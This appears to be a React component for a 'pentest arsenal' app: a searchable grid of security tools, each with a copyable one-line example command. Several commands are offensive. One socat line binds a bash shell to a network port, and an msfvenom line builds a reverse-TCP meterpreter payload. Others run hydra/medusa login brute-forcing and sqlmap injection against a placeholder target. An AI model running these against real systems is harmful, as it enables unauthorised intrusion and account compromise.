import { useState, useMemo } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Search, Check, Copy } from 'lucide-react';

type Tool = { name: string; category: string; desc: string; cmd: string };

const TOOLS: Tool[] = [
  // Recon
  { name: 'nmap',         category: 'Recon',       desc: 'Network exploration & port scanner',               cmd: 'nmap -sV -sC -p- target' },
  { name: 'masscan',      category: 'Recon',       desc: 'Fast async TCP port scanner',                      cmd: 'masscan -p1-65535 target --rate=1000' },
  { name: 'amass',        category: 'Recon',       desc: 'Attack surface mapping & asset discovery',         cmd: 'amass enum -d target.com' },
  { name: 'subfinder',    category: 'Recon',       desc: 'Passive subdomain enumeration',                    cmd: 'subfinder -d target.com' },
  { name: 'dnsx',         category: 'Recon',       desc: 'Fast multi-purpose DNS toolkit',                   cmd: 'dnsx -l subdomains.txt -resp' },
  { name: 'httpx',        category: 'Recon',       desc: 'Fast HTTP probing toolkit',                        cmd: 'httpx -l targets.txt -sc -title' },
  { name: 'nuclei',       category: 'Recon',       desc: 'Template-based vulnerability scanner',             cmd: 'nuclei -u target.com -t cves/' },
  { name: 'theHarvester', category: 'Recon',       desc: 'OSINT emails, subdomains & names',                 cmd: 'theHarvester -d target.com -b all' },
  { name: 'whatweb',      category: 'Recon',       desc: 'Web technology fingerprinter',                     cmd: 'whatweb target.com' },
  // Web
  { name: 'sqlmap',       category: 'Web',         desc: 'Automatic SQL injection tool',                     cmd: "sqlmap -u 'target.com/page?id=1' --dbs" },
  { name: 'nikto',        category: 'Web',         desc: 'Web server scanner',                               cmd: 'nikto -h target.com' },
  { name: 'gobuster',     category: 'Web',         desc: 'Directory / DNS / VHost buster',                   cmd: 'gobuster dir -u target.com -w wordlist.txt' },
  { name: 'ffuf',         category: 'Web',         desc: 'Fast web fuzzer',                                  cmd: 'ffuf -w wordlist.txt -u target.com/FUZZ' },
  { name: 'wfuzz',        category: 'Web',         desc: 'Web application fuzzer',                           cmd: 'wfuzz -c -z file,wordlist.txt target.com/FUZZ' },
  { name: 'dirb',         category: 'Web',         desc: 'Web content scanner',                              cmd: 'dirb http://target.com' },
  { name: 'mitmproxy',    category: 'Web',         desc: 'Interactive TLS intercepting proxy',               cmd: 'mitmproxy' },
  { name: 'burpsuite',    category: 'Web',         desc: 'Web app security testing platform',                cmd: 'burpsuite' },
  // Password
  { name: 'hashcat',      category: 'Password',    desc: "World's fastest password recovery",                cmd: 'hashcat -m 0 hash.txt wordlist.txt' },
  { name: 'john',         category: 'Password',    desc: 'Password cracker',                                 cmd: 'john --wordlist=wordlist.txt hash.txt' },
  { name: 'hydra',        category: 'Password',    desc: 'Network login brute-forcer',                       cmd: 'hydra -l user -P pass.txt ssh://target' },
  { name: 'medusa',       category: 'Password',    desc: 'Speedy parallel login brute-forcer',               cmd: 'medusa -h target -u user -P pass.txt -M ssh' },
  { name: 'crunch',       category: 'Password',    desc: 'Custom wordlist generator',                        cmd: 'crunch 8 12 -o wordlist.txt' },
  // Network
  { name: 'tcpdump',      category: 'Network',     desc: 'Command-line packet analyzer',                     cmd: 'tcpdump -i eth0 -w capture.pcap' },
  { name: 'tshark',       category: 'Network',     desc: 'Terminal Wireshark',                               cmd: 'tshark -r capture.pcap' },
  { name: 'netcat',       category: 'Network',     desc: 'TCP/UDP Swiss army knife',                         cmd: 'nc -lvnp 4444' },
  { name: 'socat',        category: 'Network',     desc: 'Multipurpose relay',                               cmd: 'socat TCP4-LISTEN:443,reuseaddr,fork EXEC:/bin/bash' },
  { name: 'proxychains',  category: 'Network',     desc: 'Force TCP connections through proxy',              cmd: 'proxychains nmap target.com' },
  { name: 'arp-scan',     category: 'Network',     desc: 'ARP host discovery',                               cmd: 'arp-scan --localnet' },
  // Exploitation
  { name: 'metasploit',   category: 'Exploit',     desc: 'Penetration testing framework',                    cmd: 'msfconsole' },
  { name: 'msfvenom',     category: 'Exploit',     desc: 'Payload generator',                                cmd: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ip LPORT=4444 -f elf' },
  { name: 'searchsploit', category: 'Exploit',     desc: 'ExploitDB offline search',                         cmd: 'searchsploit apache 2.4' },
  // Forensics
  { name: 'binwalk',      category: 'Forensics',   desc: 'Firmware analysis tool',                           cmd: 'binwalk -e firmware.bin' },
  { name: 'foremost',     category: 'Forensics',   desc: 'File carving / data recovery',                     cmd: 'foremost -i disk.img -o output/' },
  { name: 'strings',      category: 'Forensics',   desc: 'Extract printable strings from binary',            cmd: 'strings binary | grep -i password' },
  { name: 'volatility3',  category: 'Forensics',   desc: 'Memory forensics framework',                       cmd: 'python3 vol.py -f memory.dmp windows.pslist' },
  { name: 'xxd',          category: 'Forensics',   desc: 'Hex dump / binary editor',                         cmd: 'xxd binary | head -20' },
  // Crypto
  { name: 'openssl',      category: 'Crypto',      desc: 'Cryptography toolkit',                             cmd: 'openssl s_client -connect target.com:443' },
  { name: 'gpg',          category: 'Crypto',      desc: 'OpenPGP encryption',                               cmd: 'gpg --gen-key' },
  { name: 'hashid',       category: 'Crypto',      desc: 'Hash type identifier',                             cmd: 'hashid hash.txt' },
  // Dev / Util
  { name: 'git',          category: 'Dev',         desc: 'Distributed version control',                      cmd: 'git clone https://github.com/you/repo' },
  { name: 'python3',      category: 'Dev',         desc: 'Python 3 interpreter',                             cmd: 'python3 -m http.server 8080' },
  { name: 'jq',           category: 'Dev',         desc: 'Lightweight JSON processor',                       cmd: "curl -s api.com | jq '.data[]'" },
  { name: 'ripgrep',      category: 'Dev',         desc: 'Ultra-fast recursive grep',                        cmd: 'rg -i "password" .' },
  { name: 'tmux',         category: 'Dev',         desc: 'Terminal multiplexer',                             cmd: 'tmux new -s main' },
  { name: 'aider',        category: 'AI',          desc: 'Free AI coding agent (pairs with free models)',    cmd: 'aider --model openrouter/google/gemma-3-27b-it:free' },
  { name: 'bore',         category: 'Tunnel',      desc: 'Instant TCP tunnel to bore.pub',                   cmd: 'bore local 22 --to bore.pub --secret mysecret' },
  { name: 'cloudflared',  category: 'Tunnel',      desc: 'Cloudflare Tunnel client',                         cmd: 'cloudflared tunnel --no-autoupdate run --token $TOKEN' },
];

const ALL = 'All';
const CATEGORIES = [ALL, ...Array.from(new Set(TOOLS.map(t => t.category)))];

const CATEGORY_COLORS: Record<string, string> = {
  Recon:    'bg-blue-500/12 text-blue-400',
  Web:      'bg-amber-500/12 text-amber-400',
  Password: 'bg-red-500/12 text-red-400',
  Network:  'bg-cyan-500/12 text-cyan-400',
  Exploit:  'bg-orange-500/12 text-orange-400',
  Forensics:'bg-violet-500/12 text-violet-400',
  Crypto:   'bg-emerald-500/12 text-emerald-400',
  Dev:      'bg-indigo-500/12 text-indigo-400',
  AI:       'bg-pink-500/12 text-pink-400',
  Tunnel:   'bg-teal-500/12 text-teal-400',
};

function ToolCard({ tool }: { tool: Tool }) {
  const [copied, setCopied] = useState(false);

  const copy = async () => {
    try { await navigator.clipboard.writeText(tool.cmd); }
    catch { /* fallback */ }
    setCopied(true);
    setTimeout(() => setCopied(false), 1800);
  };

  return (
    <motion.button
      layout
      initial={{ opacity: 0, scale: 0.97 }}
      animate={{ opacity: 1, scale: 1 }}
      exit={{ opacity: 0, scale: 0.97 }}
      transition={{ duration: 0.15 }}
      onClick={copy}
      className="text-left flex flex-col bg-card border border-border/50 rounded-2xl overflow-hidden hover:border-border transition-all press-scale card-shadow w-full"
    >
      <div className="p-4 flex-1">
        <div className="flex items-start justify-between gap-2 mb-2">
          <span className="font-mono font-semibold text-foreground text-sm leading-tight">
            {tool.name}
          </span>
          <span className={`text-[10px] font-semibold px-2 py-0.5 rounded-full flex-shrink-0 ${CATEGORY_COLORS[tool.category] ?? 'bg-muted text-muted-foreground'}`}>
            {tool.category}
          </span>
        </div>
        <p className="text-xs text-muted-foreground leading-relaxed">
          {tool.desc}
        </p>
      </div>
      <div className="px-4 py-3 border-t border-border/40 bg-muted/20 flex items-center gap-2">
        <code className="flex-1 font-mono text-xs text-muted-foreground truncate">
          {copied ? '✓ Copied!' : `$ ${tool.cmd}`}
        </code>
        <div className={`w-6 h-6 flex items-center justify-center rounded-md flex-shrink-0 transition-colors ${copied ? 'text-success' : 'text-muted-foreground'}`}>
          {copied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
        </div>
      </div>
    </motion.button>
  );
}

export function Tools() {
  const [query, setQuery] = useState('');
  const [active, setActive] = useState(ALL);

  const filtered = useMemo(() => {
    const q = query.toLowerCase();
    return TOOLS.filter(t => {
      const matchCat = active === ALL || t.category === active;
      const matchQ = !q || t.name.toLowerCase().includes(q) || t.desc.toLowerCase().includes(q) || t.cmd.toLowerCase().includes(q);
      return matchCat && matchQ;
    });
  }, [query, active]);

  return (
    <div className="flex flex-col h-full">
      {/* ── Sticky header ── */}
      <div className="sticky top-0 z-20 glass-strong border-b border-border/40 px-4 pt-5 pb-3 space-y-3">
        <h1 className="text-xl font-bold text-foreground">Arsenal</h1>

        {/* Search */}
        <div className="relative">
          <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
          <input
            type="search"
            placeholder="Search tools…"
            value={query}
            onChange={e => setQuery(e.target.value)}
            className="w-full bg-muted/50 border border-border/50 focus:border-primary/50 focus:ring-2 focus:ring-primary/15 rounded-xl pl-10 pr-4 py-2.5 text-sm text-foreground placeholder:text-muted-foreground outline-none transition-all"
          />
        </div>

        {/* Category pills */}
        <div className="flex gap-2 overflow-x-auto no-scrollbar pb-0.5">
          {CATEGORIES.map(cat => (
            <button
              key={cat}
              onClick={() => setActive(cat)}
              className={`flex-shrink-0 px-3.5 py-1.5 rounded-full text-xs font-semibold transition-all press-scale ${
                active === cat
                  ? 'bg-primary text-primary-foreground shadow-sm'
                  : 'bg-muted/60 text-muted-foreground hover:text-foreground'
              }`}
            >
              {cat}
            </button>
          ))}
        </div>
      </div>

      {/* ── Grid ── */}
      <div className="flex-1 overflow-auto p-4">
        {filtered.length === 0 ? (
          <div className="flex flex-col items-center justify-center py-16 gap-3 text-muted-foreground">
            <Search className="w-8 h-8 opacity-40" />
            <p className="text-sm">No tools match "{query}"</p>
          </div>
        ) : (
          <AnimatePresence>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              {filtered.map(tool => (
                <ToolCard key={tool.name} tool={tool} />
              ))}
            </div>
          </AnimatePresence>
        )}
        <p className="text-center text-xs text-muted-foreground mt-6 pb-2">
          {filtered.length} of {TOOLS.length} tools · Tap any card to copy command
        </p>
      </div>
    </div>
  );
}
